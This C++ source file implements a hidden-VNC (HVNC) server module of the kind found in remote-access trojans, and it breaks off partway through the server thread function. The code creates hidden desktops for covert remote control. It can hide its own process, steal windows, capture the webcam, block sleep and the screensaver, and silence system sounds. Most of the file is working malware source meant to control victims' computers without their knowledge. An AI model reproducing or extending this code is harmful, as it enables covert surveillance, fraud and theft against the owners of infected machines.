#include "includes.h"
#include "hvnc.h"
#include "vnc\vnc.h"
#include "vnc\vnc_func.h"
#include "vnc\taskswitcher.h"
#include "vnc\dib.h"
#include "vnc\cpu_limit.h"
#include "vnc\windows.h"
#include "vnc\wnd_steal.h"
#include "vnc\mou.h"
#include "vnc\kbd.h"
#include "vnc\cursor.h"
#include "vnc\events.h"
#include "vnc\wnd_watcher.h"
#include "webcam\webcam.h"
#include "injlib\hidevncprocwnd.cpp"

HVNC_HANDLE *lpHandles;
CRITICAL_SECTION csHVNC;

static bool bHVNCInit=false;
static HANDLE hKillEvent;

static HANDLE hHandlesMutex,hHandlesMapping;
static DWORD *lpHandlesMapping;
static HANDLE hMarkerMutex;

static HANDLE hSharedVNCData;
static SHARED_VNC_DATA *lpSharedVNCData;
static HANDLE hDispChangeEvent;

static HWND hVNCFakeWnd,hNextViewer;

bool HVNCIsAlive(DWORD dwTimeOut)
{
    if (!bHVNCInit)
        return false;

    return (WaitForSingleObject(hKillEvent,dwTimeOut) == WAIT_TIMEOUT);
}

void SendInputDesktopClipboard()
{
    if (lpHandles)
    {
        EnterCriticalSection(&csHVNC);
        {
            HVNC_HANDLE *lpHandle=lpHandles;
            while (lpHandle)
            {
                PHVNC lpServer=lpHandle->lpServer;
                if ((lpServer) && (lpServer->bActive) && (lpServer->DeskInfo.bInputDesktop))
                    SetEvent(lpServer->EventsInfo.hClipboardUpdatedEvent);
                lpHandle=lpHandle->lpNext;
            }
        }
        LeaveCriticalSection(&csHVNC);
    }
    return;
}

LRESULT APIENTRY FakeVNCWndProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            hNextViewer=SetClipboardViewer(hWnd);
            break;
        }
        case WM_DRAWCLIPBOARD:
        {
            if (OpenClipboard(hWnd))
            {
                bool bPresent=IsClipboardFormatAvailable(CF_TEXT);
                CloseClipboard();
                if (bPresent)
                    SendInputDesktopClipboard();
                SendMessage(hNextViewer,uMsg,wParam,lParam);
            }
            break;
        }
        case WM_CHANGECBCHAIN:
        {
            if (hNextViewer != (HWND)wParam)
                SendMessage(hNextViewer,WM_CHANGECBCHAIN,wParam,lParam);
            else
                hNextViewer=(HWND)lParam;
            break;
        }
        case WM_DISPLAYCHANGE:
        {
            lpSharedVNCData->dwNewWidth=LOWORD(lParam);
            lpSharedVNCData->dwNewHeight=HIWORD(lParam);
            if ((byte)wParam == 24)
                wParam=32;
            lpSharedVNCData->bNewBitsPerPixel=(byte)wParam;
            SetEvent(hDispChangeEvent);
            break;
        }
        case WM_ENDSESSION:
        {
            VNCCleanup(true);
            break;
        }
        case WM_POWERBROADCAST:
        {
            if (lParam & 1)
                return BROADCAST_QUERY_DENY;
            break;
        }
        case WM_SYSCOMMAND:
        {
            if (wParam == SC_SCREENSAVE)
                return -1;
            break;
        }
        case WM_DESTROY:
        {
            ChangeClipboardChain(hWnd,hNextViewer);
            break;
        }
        case WM_THEMECHANGED:
        {
            if (lpHandles)
            {
                EnterCriticalSection(&csHVNC);
                {
                    HVNC_HANDLE *lpHandle=lpHandles;
                    while (lpHandle)
                    {
                        if (lpHandle->lpServer)
                        {
                            PHVNC lpServer=lpHandle->lpServer;
                            if ((lpServer->bActive) && (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_DISABLE_EFFECTS)))
                            {
                                if (lpServer->lpGlobalVNCData->dwExplorersPID)
                                {
                                    EnableSystemSounds(false);
                                    break;
                                }
                            }
                        }
                        lpHandle=lpHandle->lpNext;
                    }
                }
                LeaveCriticalSection(&csHVNC);
            }
            break;
        }
    }
    return 1;
}

static TCHAR szClass[]=_T("FakeVNCWnd");
void WINAPI FakeVNCWndThread(void*)
{
    WNDCLASS wc={0,(WNDPROC)FakeVNCWndProc,0,0,NULL,NULL,NULL,NULL,NULL,szClass};
    wc.hInstance=GetModuleHandle(0);
    RegisterClass(&wc);
    hVNCFakeWnd=CreateWindow(szClass,0,0,1,1,1,1,NULL,NULL,wc.hInstance,NULL);
    while (WaitForSingleObject(hKillEvent,0) == WAIT_TIMEOUT)
    {
        MSG msg;
        if (!GetMessage(&msg,NULL,0,0))
            break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return;
}

HVNC GetHVNC(PHVNC lpServer)
{
    HVNC hVNC=-1;
    if (lpHandles)
    {
        EnterCriticalSection(&csHVNC);
        {
            HVNC_HANDLE *lpHandle=lpHandles;
            while (lpHandle)
            {
                if (lpHandle->lpServer == lpServer)
                {
                    hVNC=lpHandle->hHandle;
                    break;
                }
                lpHandle=lpHandle->lpNext;
            }
        }
        LeaveCriticalSection(&csHVNC);
    }
    return hVNC;
}

HVNC_HANDLE *VNCGetHandleInformation(HVNC hVNC)
{
    if (hVNC == -1)
        return NULL;

    HVNC_HANDLE *lpVNC=NULL;

    if (lpHandles)
    {
        EnterCriticalSection(&csHVNC);
        {
            HVNC_HANDLE *lpHandle=lpHandles;
            while (lpHandle)
            {
                if (lpHandle->hHandle == hVNC)
                {
                    lpVNC=lpHandle;
                    break;
                }
                lpHandle=lpHandle->lpNext;
            }
        }
        LeaveCriticalSection(&csHVNC);
    }
    return lpVNC;
}

void VNCCloseHandle(HVNC hVNC)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if (lpHandle)
    {
        if (lpHandle->lpServer->rfbScreen)
            VNCStopServer(hVNC,HVNCSF_DESTOYSLOLENWNDS);

        PHVNC lpServer;
        EnterCriticalSection(&csHVNC);
        {
            lpServer=lpHandle->lpServer;

            HVNC_HANDLE *lpPrev=lpHandle->lpPrev,
                        *lpNext=lpHandle->lpNext;
            if (lpPrev)
                lpPrev->lpNext=lpNext;
            else
                lpHandles=lpNext;
            if (lpNext)
                lpNext->lpPrev=lpPrev;
            MemFree(lpHandle);
        }
        LeaveCriticalSection(&csHVNC);

        DeleteCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
        DeleteCriticalSection(&lpServer->ThreadsInfo.csThreads);

        if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
        {
            WaitForSingleObject(hHandlesMutex,INFINITE);
                for (int i=0; i < HVNC_MAX_HANDLES; i++)
                {
                    if (lpHandlesMapping[i] == lpServer->Names.dwHash)
                    {
                        for (int j=i+1; j < HVNC_MAX_HANDLES; j++)
                        {
                            lpHandlesMapping[j-1]=lpHandlesMapping[j];
                            if (!lpHandlesMapping[j])
                                break;
                        }
                        break;
                    }
                }
            ReleaseMutex(hHandlesMutex);
        }
        UnmapViewOfFile(lpServer->lpGlobalVNCData);
        SysCloseHandle(lpServer->hGlobalVNCMapping);

        SysCloseHandle(lpServer->EventsInfo.hVNCKillEvent);
        SysCloseHandle(lpServer->EventsInfo.hSharedMemMutex);
        SysCloseHandle(lpServer->EventsInfo.hInputMutex);
        SysCloseHandle(lpServer->EventsInfo.hPaintMutex);
        SysCloseHandle(lpServer->EventsInfo.hClipboardUpdatedEvent);
        SysCloseHandle(lpServer->EventsInfo.hSendThreadMessageMutex);
        SysCloseHandle(lpServer->EventsInfo.hSendThreadMessageEvent);

#ifdef _HVNC_WEBCAM
        if (lpServer->DeskInfo.bWebCam)
            CamCleanup(lpServer);
#endif
        VirtualFree(lpServer,0,MEM_DECOMMIT);
    }
    return;
}

static WORD wBrush[]={0xAAAA,0x5555,0xAAAA,0x5555,0xAAAA,0x5555,0xAAAA,0x5555};
bool VNCInit(bool bHideProcesss)
{
    if (bHVNCInit)
        return false;
    do
    {
        MemInit();
        InitializeCriticalSection(&csHVNC);
        MessageBoxTimeout=(_MessageBoxTimeout)GetProcAddress(GetModuleHandle(_T("user32")),"MessageBoxTimeoutA");
        if (!MessageBoxTimeout)
            break;

        chksum_crc32gentab();

        OSVERSIONINFO osvi;
        osvi.dwOSVersionInfoSize=sizeof(osvi);
        GetVersionEx(&osvi);
        bXP=(osvi.dwMajorVersion <= 5);

        hDefaultDesktop=OpenDesktop(_T("default"),0,FALSE,GENERIC_ALL);

        hBlackBrush=(HBRUSH)GetStockObject(BLACK_BRUSH);

        HBITMAP hTmpBmp=CreateBitmap(8,8,1,1,&wBrush);
        hFrameBrush=CreatePatternBrush(hTmpBmp);
        DeleteObject(hTmpBmp);

        ChooseBestSyncProc();

        CheckPCPerfomance();

        dwDoubleClickTime=GetDoubleClickTime();

        dwLocalesNum=GetKeyboardLayoutList(countof(hklLocales),hklLocales);
        hArrow=LoadCursor(NULL,IDC_ARROW);
        GetIconInfo(hArrow,&iiCur);
        DeleteObject(iiCur.hbmMask);
        DeleteObject(iiCur.hbmColor);

        hKillEvent=CreateEvent(NULL,true,false,HVNC_KILL_EVENT_NAME);
        if ((!hKillEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
#ifndef _DEBUG
            break;
#else
            ;
#endif

        hHandlesMutex=CreateMutex(NULL,false,HVNC_HANDLES_MUTEX_NAME);
        if ((!hHandlesMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
#ifndef _DEBUG
            break;
#else
            ;
#endif

        hHandlesMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,300*sizeof(DWORD),HVNC_HANDLES_MAPPING_NAME);
        if ((!hHandlesMapping) || (GetLastError() == ERROR_ALREADY_EXISTS))
#ifndef _DEBUG
            break;
#else
            ;
#endif

        lpHandlesMapping=(DWORD *)MapViewOfFile(hHandlesMapping,FILE_MAP_ALL_ACCESS,0,0,0);
        if (!lpHandlesMapping)
#ifndef _DEBUG
            break;
#else
            ;
#endif

        hSharedVNCData=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(SHARED_VNC_DATA),HVNC_SHARED_VNC_MAPPING_NAME);
        if ((!hSharedVNCData) || (GetLastError() == ERROR_ALREADY_EXISTS))
#ifndef _DEBUG
            break;
#else
            ;
#endif

        lpSharedVNCData=(SHARED_VNC_DATA *)MapViewOfFile(hSharedVNCData,FILE_MAP_ALL_ACCESS,0,0,0);
        if (!lpSharedVNCData)
#ifndef _DEBUG
            break;
#else
            ;
#endif

        if (bHideProcesss)
            hMarkerMutex=RegisterHiddenProcess();
        hDispChangeEvent=CreateEvent(NULL,false,false,HVNC_DISP_CHANGE_EVENT_NAME);
        if ((!hDispChangeEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
#ifndef _DEBUG
            break;
#else
            ;
#endif

        SysCloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)FakeVNCWndThread,NULL,0,NULL));
        bHVNCInit=true;
    }
    while (false);

    if (!bHVNCInit)
    {
        if (hKillEvent)
        {
            SysCloseHandle(hKillEvent);
            hKillEvent=NULL;
        }
        bHVNCInit=true;
        VNCCleanup(true);
    }
    return bHVNCInit;
}

static void WINAPI DestroyThread(HVNC hVNC)
{
    VNCDestroyServer(hVNC);
    return;
}

void VNCCleanup(bool bDestroyServers)
{
    if (bHVNCInit)
    {
        if ((!lpHandles) || ((lpHandles) &&  (bDestroyServers)))
        {
            if (hKillEvent)
                SetEvent(hKillEvent);

            EnterCriticalSection(&csHVNC);
            {
                HVNC_HANDLE *lpHandle=lpHandles;
                while (lpHandle)
                {
                    SysCloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)DestroyThread,(LPVOID)lpHandle->hHandle,0,NULL));
                    lpHandle=lpHandle->lpNext;
                }
            }
            LeaveCriticalSection(&csHVNC);

            while (lpHandles)
                Sleep(1);

            if (hBlackBrush)
            {
                DeleteObject(hBlackBrush);
                hBlackBrush=NULL;
            }

            if (hFrameBrush)
            {
                DeleteObject(hFrameBrush);
                hFrameBrush=NULL;
            }

            DeleteCriticalSection(&csHVNC);

            if (hArrow)
            {
                DestroyCursor(hArrow);
                hArrow=NULL;
            }

            EnableSystemSounds(true);

            if (hHandlesMutex)
            {
                SysCloseHandle(hHandlesMutex);
                hHandlesMutex=NULL;
            }

            if (lpHandlesMapping)
            {
                UnmapViewOfFile(lpHandlesMapping);
                lpHandlesMapping=NULL;
            }

            if (hHandlesMapping)
            {
                SysCloseHandle(hHandlesMapping);
                hHandlesMapping=NULL;
            }

            if (lpSharedVNCData)
            {
                UnmapViewOfFile(lpSharedVNCData);
                lpSharedVNCData=NULL;
            }

            if (hSharedVNCData)
            {
                SysCloseHandle(hSharedVNCData);
                hSharedVNCData=NULL;
            }

            if (hMarkerMutex)
            {
                SysCloseHandle(hMarkerMutex);
                hMarkerMutex=NULL;
            }

            if (hKillEvent)
            {
                SysCloseHandle(hKillEvent);
                hKillEvent=NULL;
            }

            if (hDispChangeEvent)
            {
                SysCloseHandle(hDispChangeEvent);
                hDispChangeEvent=NULL;
            }

            if (hVNCFakeWnd)
            {
                DestroyWindow(hVNCFakeWnd);
                hVNCFakeWnd=NULL;
            }
            bHVNCInit=false;
        }
    }
    return;
}

HVNC VNCCreateServer(HVNC_INITIALIZE *lpVNCInit)
{
    if (!bHVNCInit)
        return -1;

    HVNC hVNC=1;
    EnterCriticalSection(&csHVNC);
    {
        HVNC_HANDLE *lpHandle=NULL;
        DWORD dwHash=chksum_crc32((byte*)lpVNCInit->szDeskName,lstrlenA(lpVNCInit->szDeskName));
        if (!lpHandles)
            lpHandle=lpHandles=(HVNC_HANDLE*)MemAlloc(sizeof(HVNC_HANDLE));
        else
        {
            lpHandle=lpHandles;
            HVNC_HANDLE *lpPrev;
            while (lpHandle)
            {
                if (lpHandle->lpServer->Names.dwHash == dwHash)
                {
                    LeaveCriticalSection(&csHVNC);
                    return -1;
                }
                lpPrev=lpHandle;
                lpHandle=lpHandle->lpNext;
            }
            lpHandle=lpPrev->lpNext=(HVNC_HANDLE*)MemAlloc(sizeof(HVNC_HANDLE));
            lpHandle->lpPrev=lpPrev;
            hVNC=lpPrev->hHandle+1;
        }
        PHVNC lpServer=lpHandle->lpServer=(PHVNC)VirtualAlloc(NULL,sizeof(HVNCS),MEM_COMMIT,PAGE_READWRITE);
        lpHandle->hHandle=hVNC;
        InitializeCriticalSection(&lpServer->ThreadsInfo.csThreads);
        InitializeCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
        lpServer->EventsInfo.dwSleep=50;

        lstrcpyA(lpServer->DeskInfo.szDeskName,lpVNCInit->szDeskName);
        lpServer->DeskInfo.dwFlags=lpVNCInit->dwFlags;
#ifdef _HVNC_WEBCAM
        if (!memcmp(lpVNCInit->szDeskName,"#webcam",sizeof("#webcam")-1))
        {
            lpServer->DeskInfo.bWebCam=true;

            lpServer->DeskInfo.dwFlags|=HVNC_WEB_CAM;
            if (!InitWebCam(lpServer))
            {
                 LeaveCriticalSection(&csHVNC);
                 VNCCloseHandle(lpHandle->hHandle);
                 return -1;
            }
        }
        else
#endif
        {
            HDESK hInputDesktop=OpenInputDesktop(0,FALSE,DESKTOP_READOBJECTS);
            if (hInputDesktop)
            {
                char szInputDesktopName[100];
                GetUserObjectInformationA(hInputDesktop,UOI_NAME,szInputDesktopName,sizeof(szInputDesktopName),NULL);
                if (!lstrcmpiA(szInputDesktopName,lpVNCInit->szDeskName))
                {
                    lpServer->DeskInfo.bInputDesktop=true;
                    lpServer->DeskInfo.dwFlags|=HVNC_INPUT_DESKTOP;
                }
                CloseDesktop(hInputDesktop);
            }

            if (lpServer->DeskInfo.dwFlags & HVNC_SCREEN_SIZE_DETERMINED)
            {
                if ((!lpVNCInit->bBitsPerPixel) || (!lpVNCInit->dwHeight) || (!lpVNCInit->dwWidth))
                {
                     LeaveCriticalSection(&csHVNC);
                     VNCCloseHandle(lpHandle->hHandle);
                     return -1;
                }
                SetScreenSize(lpServer,lpVNCInit->dwHeight,lpVNCInit->dwWidth,lpVNCInit->bBitsPerPixel);
            }
        }

        lpServer->Names.dwHash=dwHash;
        InitGlobalDataNames(lpServer);
        if (!InitGlobalData(lpServer))
        {
            LeaveCriticalSection(&csHVNC);
            VNCCloseHandle(lpHandle->hHandle);
            return -1;
        }

        lpServer->lpClientGoneHook=lpVNCInit->lpClientGoneHook;
        lpServer->lpNewClientHook=lpVNCInit->lpNewClientHook;

        if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
        {
            lstrcpyA(lpServer->lpGlobalVNCData->szDeskName,lpServer->DeskInfo.szDeskName);
            lpServer->lpGlobalVNCData->dwDeskFlags=lpVNCInit->dwFlags;

            WaitForSingleObject(hHandlesMutex,INFINITE);
                for (int i=0; i < HVNC_MAX_HANDLES; i++)
                {
                    if (!lpHandlesMapping[i])
                    {
                        lpHandlesMapping[i]=lpServer->Names.dwHash;
                        break;
                    }
                }
            ReleaseMutex(hHandlesMutex);
        }
    }
    LeaveCriticalSection(&csHVNC);
    return hVNC;
}

void WINAPI ThreadsWatchThread(PHVNC lpServer)
{
    if (lpServer)
    {
        THREADITEM *lpIDs=lpServer->lpGlobalVNCData->dwIDs;
        while (lpIDs->dwId)
        {
            if (lpIDs->hThread)
                SysCloseHandle(lpIDs->hThread);
            memset(lpIDs,0,sizeof(THREADITEM));
            lpIDs++;
        }

        while (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,1) == WAIT_TIMEOUT)
        {
            g_enter(hSendThreadMessageMutex)
            {
                lpIDs=lpServer->lpGlobalVNCData->dwIDs;
                for (int i=0; i < countof(lpServer->lpGlobalVNCData->dwIDs); i++)
                {
                    if (!lpIDs[i].dwId)
                        break;

                    bool bDead=true;
                    if (!lpIDs[i].hThread)
                        lpIDs[i].hThread=OpenThread(THREAD_ALL_ACCESS,false,lpIDs[i].dwId);

                    if (lpIDs[i].hThread)
                    {
                        DWORD dwRes;
                        if ((dwRes=WaitForSingleObject(lpIDs[i].hThread,0)) == WAIT_TIMEOUT)
                            bDead=false;
                    }

                    if (bDead)
                    {
                        if (lpIDs[i].hThread)
                            SysCloseHandle(lpIDs[i].hThread);
                        int j=i;
                        for (; j < countof(lpServer->lpGlobalVNCData->dwIDs); j++)
                        {
                            if (!lpIDs[j].dwId)
                                break;
                            memcpy(&lpIDs[j],&lpIDs[j+1],sizeof(THREADITEM));
                        }
                        memset(&lpIDs[j+1],0,sizeof(THREADITEM));
                        i--;
                    }
                }
            }
            g_leave(hSendThreadMessageMutex)
        }
    }
    return;
}

void VNCStopServer(HVNC hVNC,DWORD dwFlags)
{
    if (!bHVNCInit)
        return;

    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if (!lpHandle)
        return;

    PHVNC lpServer=lpHandle->lpServer;
    if (!lpServer)
        return;

    EnterCriticalSection(&csHVNC);
    {
        if (!lpServer->bStopped)
        {
            if (lpServer->rfbScreen)
            {
                if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
                {
                    UnmapViewOfFile(lpServer->lpSharedMemMapping);
                    SysCloseHandle(lpServer->hSharedMemMapping);
                    lpServer->lpSharedMemMapping=NULL;
                }
                rfbScreenInfoPtr rfbScreen=lpServer->rfbScreen;
                lpServer->bActive=false;
                SetEvent(lpServer->EventsInfo.hVNCKillEvent);
                WaitThreadsDeath(lpServer);
                rfbShutdownServer(rfbScreen,TRUE);
                lpServer->bUpdateThreadStarted=false;
                if (rfbScreen->authPasswdData)
                {
                    PASSWORD_ITEM **lppPasswords=(PASSWORD_ITEM **)rfbScreen->authPasswdData;
                    for (int i=0; lppPasswords[i]; i++)
                        MemFree(lppPasswords[i]);
                    MemFree(lppPasswords);
                    rfbScreen->authPasswdData=NULL;
                }
                VirtualFree(rfbScreen->frameBuffer,0,MEM_DECOMMIT);
                rfbScreenCleanup(rfbScreen);
                lpServer->rfbScreen=NULL;

                if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
                    DestroyTaskSwitcherWnd(lpServer,false);

                if (lpServer->WndWatcherInfo.lpZOrderList)
                {
                    Z_ORDER_LIST_ITEM *lpItem=lpServer->WndWatcherInfo.lpZOrderList;
                    while (lpItem)
                    {
                        Z_ORDER_LIST_ITEM *lpPrev=lpItem;
                        lpItem=lpItem->lpNext;
                        MemFree(lpPrev);
                    }
                    lpServer->WndWatcherInfo.lpZOrderList=NULL;
                    StopWatcher(lpServer);
                }

                if (lpServer->DIBInfo.lpChecksums)
                {
                    VirtualFree(lpServer->DIBInfo.lpChecksums,0,MEM_DECOMMIT);
                    lpServer->DIBInfo.lpChecksums=NULL;
                }

                if (lpServer->DIBInfo.hIntermedMemDC)
                {
                    SelectObject(lpServer->DIBInfo.hIntermedMemDC,lpServer->DIBInfo.hIntermedOldBitmap);
                    DeleteObject(lpServer->DIBInfo.hIntermedMemBitmap);
                    DeleteDC(lpServer->DIBInfo.hIntermedMemDC);
                    lpServer->DIBInfo.hIntermedMemDC=NULL;
                }
                if (lpServer->DIBInfo.hCompDC)
                {
                    SelectObject(lpServer->DIBInfo.hCompDC,lpServer->DIBInfo.hOldBitmap);
                    DeleteObject(lpServer->DIBInfo.hBitmap);
                    DeleteDC(lpServer->DIBInfo.hCompDC);
                    lpServer->DIBInfo.hCompDC=NULL;
                }
                if (lpServer->DIBInfo.hTmpCompDC)
                {
                    SelectObject(lpServer->DIBInfo.hTmpCompDC,lpServer->DIBInfo.hTmpOldBitmap);
                    DeleteObject(lpServer->DIBInfo.hTmpBitmap);
                    DeleteDC(lpServer->DIBInfo.hTmpCompDC);
                    lpServer->DIBInfo.hTmpCompDC=NULL;
                }
                ReleaseDC(NULL,lpServer->DIBInfo.hDC);
            }

            lpServer->EventsInfo.dwClients=0;
            if (lpServer->hDesktop)
            {
                CloseDesktop(lpServer->hDesktop);
                lpServer->hDesktop=NULL;
            }
            lpServer->dwExplorersPID=0;
            lpServer->bStopped=true;
        }
    }
    LeaveCriticalSection(&csHVNC);
    return;
}

bool VNCGetServerInfo(HVNC hVNC,HVNC_SERVER_INFO *lpInfo)
{
    bool bRet=false;
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((lpHandle) && (lpHandle->lpServer) && (lpInfo) && (lpInfo->dwMask))
    {
        PHVNC lpServer=lpHandle->lpServer;
        if (lpInfo->dwMask & HVNCSI_DESKNAME)
        {
            bRet=true;
            lstrcpyA(lpInfo->szDeskName,lpServer->DeskInfo.szDeskName);
        }
        if (lpInfo->dwMask & HVNCSI_SCREENSIZE)
        {
            bRet=true;
            lpInfo->bBitsPerPixel=lpServer->DeskInfo.bBitsPerPixel;
            lpInfo->dwWidth=lpServer->DeskInfo.dwWidth;
            lpInfo->dwHeight=lpServer->DeskInfo.dwHeight;
        }
        if (lpInfo->dwMask & HVNCSI_DESKFLAGS)
        {
            bRet=true;
            lpInfo->dwFlags=lpServer->DeskInfo.dwFlags;
        }
        if (lpInfo->dwMask & HVNCSI_CLIENTSCOUNT)
        {
            bRet=true;
            lpInfo->dwClientsCount=lpServer->EventsInfo.dwClients;
        }
        if (lpInfo->dwMask & HVNCSI_SERVERSTATUS)
        {
            bRet=true;
            lpInfo->dwStatus=VNCGetServerStatus(hVNC);
        }
        if (lpInfo->dwMask & HVNCSI_DESKTYPE)
        {
            bRet=true;
            if (lpServer->DeskInfo.bWebCam)
                lpInfo->dwDeskType=HVNCDT_WEBCAM;
            else if (lpServer->DeskInfo.bInputDesktop)
                lpInfo->dwDeskType=HVNCDT_INPUTDESK;
            else
                lpInfo->dwDeskType=HVNCDT_HIDDENDESK;
        }
    }
    return bRet;
}

void VNCDestroyServer(HVNC hVNC)
{
    if (!bHVNCInit)
        return;

    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if (!lpHandle)
        return;

    VNCCloseHandle(hVNC);
    return;
}

void VNCEnumUsers(HVNC hVNC,CLIENTSENUMPROC *lpEnumProc)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((!lpEnumProc) || (!lpHandle) || (!lpHandle->lpServer))
        return;
    PHVNC lpServer=lpHandle->lpServer;
    if (lpServer->EventsInfo.dwClients)
    {
        HVNC_CLIENT_INFO ClientInfo={0};
        ClientInfo.hVNC=hVNC;

        rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(lpServer->rfbScreen);
        rfbClientPtr cl=rfbClientIteratorHead(i);
        while (cl)
        {
            HVNC_SHORT_CLIENT_INFO *lpClientInfo=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
            memcpy(&ClientInfo.saClient,&lpClientInfo->saClient,sizeof(ClientInfo.saClient));
            memcpy(&ClientInfo.piPassword,&lpClientInfo->piPassword,sizeof(ClientInfo.piPassword));
            if (!lpEnumProc(&ClientInfo))
                break;
            cl=rfbClientIteratorNext(i);
        }
        rfbReleaseClientIterator(i);
    }
    return;
}

void VNCDisconnectUser(HVNC hVNC,char *lpPassword,in_addr dwAddr)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((!lpHandle) || (!lpHandle->lpServer))
        return;
    PHVNC lpServer=lpHandle->lpServer;
    if (lpServer->EventsInfo.dwClients)
    {
        rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(lpServer->rfbScreen);
        rfbClientPtr cl=rfbClientIteratorHead(i);
        while (cl)
        {
            rfbClientPtr clPrev=cl;
            cl=rfbClientIteratorNext(i);
            HVNC_SHORT_CLIENT_INFO *lpClientInfo=(HVNC_SHORT_CLIENT_INFO *)clPrev->clientData;
            if ((lpClientInfo->saClient.sin_addr.s_addr == dwAddr.s_addr) && ((!lpPassword) || (!lstrcmpA(lpClientInfo->piPassword.szPassword,lpPassword))))
            {
                rfbClientConnectionGone(clPrev);
                break;
            }
        }
        rfbReleaseClientIterator(i);
    }
    return;
}

void VNCDisconnectAllUsers(HVNC hVNC)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((!lpHandle) || (!lpHandle->lpServer))
        return;
    PHVNC lpServer=lpHandle->lpServer;
    if (lpServer->EventsInfo.dwClients)
    {
        rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(lpServer->rfbScreen);
        rfbClientPtr cl=rfbClientIteratorHead(i);
        while (cl)
        {
            rfbClientPtr clPrev=cl;
            cl=rfbClientIteratorNext(i);
            rfbClientConnectionGone(clPrev);
        }
        rfbReleaseClientIterator(i);
    }
    return;
}

static void DisconnectUser(PHVNC lpServer,PASSWORD_ITEM *lpPassword)
{
    if (lpServer->EventsInfo.dwClients)
    {
        rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(lpServer->rfbScreen);
        rfbClientPtr cl=rfbClientIteratorHead(i);
        while (cl)
        {
            rfbClientPtr clPrev=cl;
            cl=rfbClientIteratorNext(i);
            HVNC_SHORT_CLIENT_INFO *lpClientInfo=(HVNC_SHORT_CLIENT_INFO *)clPrev->clientData;
            if ((!lpPassword) || (!lstrcmpA(lpClientInfo->piPassword.szPassword,lpPassword->szPassword)))
                rfbClientConnectionGone(clPrev);
        }
        rfbReleaseClientIterator(i);
    }
    return;
}

void VNCSetNewPasswordsList(HVNC hVNC,bool bDisconnectLoggedUsers,PASSWORDS_LIST *lpPasswordsList)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if ((!lpHandle) || (!lpHandle->lpServer))
        return;

    PHVNC lpServer=lpHandle->lpServer;
    rfbScreenInfoPtr rfbScreen=lpServer->rfbScreen;

    bool bReplaceList=false;
    if (rfbScreen->authPasswdData)
    {
        if ((lpPasswordsList) && (lpPasswordsList->dwPasswordsCount))
        {
            PASSWORD_ITEM **lppPasswords=(PASSWORD_ITEM **)rfbScreen->authPasswdData;
            for (int i=0; i < lpPasswordsList->dwPasswordsCount; i++)
            {
                for (int j=0; lppPasswords[j]; j++)
                {
                    if (!lstrcmpA(lpPasswordsList->piPasswords[i].szPassword,lppPasswords[j]->szPassword))
                    {
                        if (lppPasswords[j]->dwFlags == lpPasswordsList->piPasswords[i].dwFlags)
                            lppPasswords[j]->dwFlags=-1;
                    }
                }
            }
            bReplaceList=true;
        }
        else
            rfbScreen->newClientHook=OnNewClient;

        PASSWORD_ITEM **lppPasswords=(PASSWORD_ITEM **)rfbScreen->authPasswdData;
        for (int i=0; lppPasswords[i]; i++)
        {
            if (lppPasswords[i]->dwFlags != -1)
            {
                if (bDisconnectLoggedUsers)
                    DisconnectUser(lpServer,lppPasswords[i]);
            }
            MemFree(lppPasswords[i]);
        }
        MemFree(lppPasswords);
        rfbScreen->authPasswdData=NULL;
    }
    else if ((lpPasswordsList) && (lpPasswordsList->dwPasswordsCount))
    {
        if (bDisconnectLoggedUsers)
            DisconnectUser(lpServer,NULL);
        bReplaceList=true;
        rfbScreen->passwordCheck=OnNewClientAuth;
    }

    if (bReplaceList)
    {
        DWORD dwPasswordsCount=lpPasswordsList->dwPasswordsCount;
        PASSWORD_ITEM **lppPasswords=(PASSWORD_ITEM **)MemAlloc((dwPasswordsCount+1)*sizeof(PASSWORD_ITEM *));

        for (DWORD i=0; i < dwPasswordsCount; i++)
        {
            lppPasswords[i]=(PASSWORD_ITEM*)MemAlloc(sizeof(PASSWORD_ITEM));
            lppPasswords[i]->dwFlags=lpPasswordsList->piPasswords[i].dwFlags;
            lstrcpyA(lppPasswords[i]->szPassword,lpPasswordsList->piPasswords[i].szPassword);
        }
        rfbScreen->authPasswdData=lppPasswords;
    }

    return;
}

void WINAPI VNCServerThread(HVNC hVNC)
{
    HVNC_HANDLE *lpHandle=VNCGetHandleInformation(hVNC);
    if (!lpHandle)
        return;

    if (!SetThreadExecutionState(ES_CONTINUOUS+ES_SYSTEM_REQUIRED+ES_AWAYMODE_REQUIRED))
        SetThreadExecutionState(ES_CONTINUOUS+ES_SYSTEM_REQUIRED);
    SetThreadDesktopEx(hDefaultDesktop);

    PHVNC lpServer=lpHandle->lpServer;
